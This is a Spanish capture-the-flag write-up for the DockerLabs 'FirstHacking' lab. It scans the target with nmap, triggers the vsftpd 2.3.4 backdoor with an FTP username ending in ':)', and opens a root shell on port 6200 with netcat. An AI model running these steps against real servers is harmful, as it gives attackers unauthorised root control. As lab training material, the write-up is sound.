@@ -1,0 +1,100 @@
+---
+titulo: FirstHacking
+plataforma: dockerlabs
+dificultad: muy-facil
+sistemaOperativo: linux
+fecha: 2026-10-09
+tecnicas:
+  - vsftpd backdoor
+  - service enumeration
+  - command execution
+herramientas:
+  - nmap
+  - ftp
+  - netcat
+resumen: Explotación de la puerta trasera incluida en vsftpd 2.3.4 para obtener una shell con privilegios de root en un laboratorio controlado.
+borrador: false
+---
+
+## Resumen
+
+FirstHacking es una máquina introductoria de DockerLabs centrada en identificar y explotar una versión vulnerable de **vsftpd 2.3.4**. El servicio contiene una puerta trasera conocida que abre una shell en el puerto `6200` al recibir un usuario concreto.
+
+<Callout tipo="warning" titulo="Entorno autorizado">
+  Todas las acciones de este writeup se realizaron en un laboratorio local preparado para practicar. No ejecutes estas técnicas contra sistemas sin permiso explícito.
+</Callout>
+
+## Reconocimiento
+
+Primero comprobamos que el objetivo responde y lanzamos un escaneo completo de puertos con detección de servicios.
+
+```bash
+ping -c 1 172.17.0.2
+nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
+```
+
+El escaneo descubre FTP en el puerto `21`. Hacemos una segunda pasada dirigida para identificar la versión y ejecutar los scripts básicos de Nmap.
+
+<Terminal comando="nmap -sCV -p21 172.17.0.2">
+  <pre>21/tcp open  ftp  vsftpd 2.3.4
+Service Info: OS: Unix</pre>
+</Terminal>
+
+## Enumeración
+
+La versión es el dato decisivo. Una búsqueda local en Exploit Database confirma que `vsftpd 2.3.4` está asociado a una puerta trasera introducida en una distribución comprometida del servidor.
+
+```bash
+searchsploit vsftpd 2.3.4
+```
+
+El comportamiento vulnerable se activa enviando un nombre de usuario terminado en `:)`. Si el servicio está comprometido, abre una shell en el puerto `6200`.
+
+<Callout tipo="info">
+  La detección de versión no demuestra por sí sola que el objetivo sea vulnerable. Verificamos el comportamiento de forma controlada antes de sacar conclusiones.
+</Callout>
+
+## Explotación
+
+Nos conectamos al servicio FTP y enviamos el patrón que activa la puerta trasera.
+
+<Terminal comando="ftp 172.17.0.2">
+  <pre>Connected to 172.17.0.2.
+220 (vsFTPd 2.3.4)
+Name: test:)
+331 Please specify the password.</pre>
+</Terminal>
+
+En otra terminal comprobamos el nuevo puerto y nos conectamos con Netcat.
+
+```bash
+nmap -p6200 172.17.0.2
+nc 172.17.0.2 6200
+```
+
+<Terminal comando="id">
+  <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+</Terminal>
+
+## Escalada de privilegios
+
+No es necesaria en esta máquina: la puerta trasera entrega directamente una shell con UID `0`. En un entorno real, este acceso supone el compromiso total del sistema.
+
+<Callout tipo="tip" titulo="Comprobación útil">
+  Ejecuta siempre `id`, `whoami` y `hostname` al conseguir acceso. Así confirmas el usuario efectivo y que la shell pertenece al objetivo esperado.
+</Callout>
+
+## Flags y conclusión
+
+Localizamos la prueba del laboratorio en el directorio de root. El valor siguiente es ilustrativo y permanece oculto hasta que decidas mostrarlo.
+
+<Flag tipo="root">DOCKERLABS&#123;vsftpd_backdoor_lab&#125;</Flag>
+
+La máquina queda resuelta al identificar la versión vulnerable, activar la puerta trasera y verificar que la shell obtenida dispone de privilegios de administrador.
+
+## Lecciones aprendidas
+
+- La enumeración de versiones puede revelar un camino de ataque inmediato.
+- Una vulnerabilidad conocida debe validarse contra el comportamiento real del servicio.
+- Después de obtener una shell, hay que confirmar identidad, host y privilegios.
+- Las versiones antiguas y el software obtenido desde fuentes no confiables aumentan mucho la superficie de ataque.
